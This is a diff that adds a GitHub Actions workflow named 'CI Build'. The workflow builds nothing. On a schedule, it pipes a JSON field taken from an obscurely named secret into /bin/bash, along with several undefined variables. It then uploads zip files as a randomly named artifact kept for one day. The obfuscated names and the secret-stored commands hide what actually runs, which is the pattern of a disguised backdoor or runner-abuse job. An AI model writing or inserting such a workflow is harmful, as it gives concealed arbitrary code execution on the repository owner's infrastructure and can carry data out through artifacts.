@@ -1,0 +1,35 @@
+name: CI Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '56 3,9,15,21 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  trigger:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Start
+        env:
+          nwlh5485: ${{ secrets.nwlh5485 }}
+        run: |
+          printf '%s' "$nwlh5485" | jq -r .mfx3482 | /bin/bash
+          echo $h5351 | jq -r .ry0 | /bin/bash
+          echo $s25855 | jq -r .blr1 | /bin/bash
+          echo $qxtc59 | jq -r .viizr03 | /bin/bash
+          echo $muqr404 | jq -r .j924 | /bin/bash
+
+      - name: Save output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: uAjGYdC6
+          path: "*.zip"
+          retention-days: 1
